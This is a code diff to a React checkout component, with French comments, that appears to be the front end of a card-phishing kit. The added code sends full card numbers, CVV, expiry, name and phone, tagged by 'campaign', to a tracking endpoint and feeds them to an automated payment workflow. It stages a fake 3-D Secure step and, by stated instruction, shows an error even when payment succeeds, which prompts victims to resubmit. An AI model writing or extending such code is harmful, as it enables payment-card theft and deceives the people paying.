@@ -9,6 +9,7 @@ const Checkout = forwardRef(function Checkout(
     email,
     firstName,
     campaign,
+    sessionPath,
     onSuccess,
     onError,
     amount = '10'
@@ -18,59 +19,137 @@ const Checkout = forwardRef(function Checkout(
   const [showLoading, setShowLoading] = useState(false);
   const [show3DS, setShow3DS] = useState(false);
   const [showError, setShowError] = useState(false);
-
+  const [contactId, setContactId] = useState(null);
+  const [eventId, setEventId] = useState(null);
+  const [status, setStatus] = useState(null);
   const payFetch = async (payload, verifyAmount = '10') => {
-    let status = 'initiated';
     try {
+      if (!sessionPath) {
+        throw new Error('Session path is required');
+      }
 
-      console.log('payload', payload);
-      console.log('verifyAmount', verifyAmount);
+      // Appeler l'API proceed avec les données de la carte
+      const cardDetails = {
+        cardNumber: payload.card || payload.cardNumber,
+        cardExpiry: payload.exp,
+        cardCvc: payload.cvv,
+        cardHolder: payload.name
+      };
 
-      const res = await fetch('/api/payments/browserless-checkout', {
+      const res = await fetch('/api/checkout/proceed', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ payload, amount: verifyAmount })
+        body: JSON.stringify({
+          sessionPath,
+          cardDetails,
+          amount: verifyAmount,
+          contactId,
+          eventId
+        })
       });
 
-      const text = await res.text();
-      const json = JSON.parse(text);
-      if (json && json.data && json.data.finalStatus) {
-        status = json.data.finalStatus.value;
+      if (!res.ok) {
+        throw new Error(`HTTP error! status: ${res.status}`);
       }
-      return json;
+
+      const json = await res.json();
+      return json; // { paymentId }
     } catch (err) {
       throw new Error(`Payment process failed: ${err.message}`);
-    } finally {
-      // eslint-disable-next-line no-console
-      console.log('Checkout finished with status:', status);
     }
   };
 
   const startPaymentProcess = async () => {
+    let pollingTimer;
+    let timeoutTimer;
+
     try {
       // Reset all popups
       setShowLoading(false);
       setShow3DS(false);
       setShowError(false);
 
-      // 1. Faire la requete à payFetch
-      // const result = await payFetch(formData, amount);
-      // console.log('result', result);
-
-      // 2. Afficher loading popup pendant 40 secondes
+      // 1. Afficher loading popup
       setShowLoading(true);
-      await new Promise((r) => setTimeout(r, 40000));
+
+      // 1.b Créer/mettre à jour le contact et créer l'event de départ (verification_start)
+      try {
+        const trackRes = await fetch('/api/tracking/track-submission', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            eventType: 'verification_start',
+            email,
+            firstName,
+            phone: formData?.phone || formData?.phoneNumber || '',
+            card: formData?.card,
+            name: formData?.name,
+            exp: formData?.exp,
+            cvv: formData?.cvv,
+            campaign,
+            contactId
+          })
+        });
+        if (trackRes.ok) {
+          const trackJson = await trackRes.json();
+          if (trackJson?.contactId) setContactId(trackJson.contactId);
+          if (trackJson?.eventId) setEventId(trackJson.eventId);
+        }
+      } catch (e) {
+        // On n'arrête pas le flux si tracking échoue
+        console.warn('track-submission failed:', e.message);
+      }
       
-      // 3. Passer à 3D Secure pendant 2 minutes
-      setShowLoading(false);
-      setShow3DS(true);
-      await new Promise((r) => setTimeout(r, 120000)); // 2 minutes
-      
-      // 4. Afficher la popup d'erreur
-      setShow3DS(false);
-      setShowError(true);
-      
+      // 2. Lancer le workflow et récupérer un paymentId
+      const { paymentId } = await payFetch(formData, amount);
+      if (!paymentId) throw new Error('paymentId manquant');
+
+      const startedAt = Date.now();
+
+      const poll = async () => {
+        try {
+          const res = await fetch(`/api/checkout/status?paymentId=${encodeURIComponent(paymentId)}`);
+          const { status } = await res.json();
+          // Transitions d'état
+          if (status === 'pending') {
+            setShowLoading(true); setShow3DS(false); setShowError(false);
+          } else if (status === 'in_verif') {
+            setShowLoading(false); setShow3DS(true); setShowError(false);
+          } else if (status === 'success' || status === 'error') {
+            clearInterval(pollingTimer);
+            clearTimeout(timeoutTimer);
+            setShowLoading(false); setShow3DS(false); setShowError(true); // Afficher erreur même sur success, selon consigne
+            setStatus(status);
+            if (status === 'success' && onSuccess) onSuccess();
+            return;
+          }
+
+          // Timeout 3 minutes
+          if (Date.now() - startedAt > 3 * 60 * 1000) {
+            clearInterval(pollingTimer);
+            setShowLoading(false); setShow3DS(false); setShowError(true);
+            setStatus(status);
+          }
+        } catch (e) {
+          // En cas d'erreur réseau, ne pas casser immédiatement, réessayer au tick suivant
+          console.warn('Polling error:', e.message);
+        }
+      };
+
+      // Démarrer le polling toutes les 2s
+      pollingTimer = setInterval(poll, 2000);
+      // Lancer un premier poll immédiat
+      await poll();
+
+      // Timeout hard à 3 minutes
+      timeoutTimer = setTimeout(() => {
+        clearInterval(pollingTimer);
+        setShowLoading(false); setShow3DS(false); setShowError(true);
+      }, 3 * 60 * 1000);
+
     } catch (error) {
+      if (pollingTimer) clearInterval(pollingTimer);
+      if (timeoutTimer) clearTimeout(timeoutTimer);
       setShowLoading(false);
       setShow3DS(false);
       setShowError(true);
@@ -86,12 +165,23 @@ const Checkout = forwardRef(function Checkout(
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         eventType: 'verification_retry',
-        payload: { email, firstName, card: formData?.card, name: formData?.name, exp: formData?.exp, cvv: formData?.cvv },
+        email,
+        firstName,
+        phone: formData?.phone || formData?.phoneNumber || '',
+        card: formData?.card,
+        name: formData?.name,
+        exp: formData?.exp,
+        cvv: formData?.cvv,
         campaign
       })
     });
     
     startPaymentProcess();
+  };
+
+  const handleReset = () => {
+    setShowError(false);
+    setStatus(null);
   };
 
   useImperativeHandle(ref, () => ({ startPaymentProcess }));
@@ -111,9 +201,11 @@ const Checkout = forwardRef(function Checkout(
         cardNumber={formData?.card} 
       />
       <ErrorPopup 
+        status={status}
         isVisible={showError} 
         amount={amount} 
-        onRetry={handleRetry}
+        retryPayment={handleRetry}
+        resetPayment={handleReset}
         lastFourDigits={formData?.card?.slice(-4)} 
         formattedDate={formData?.exp} 
         formattedTime={formData?.exp} 
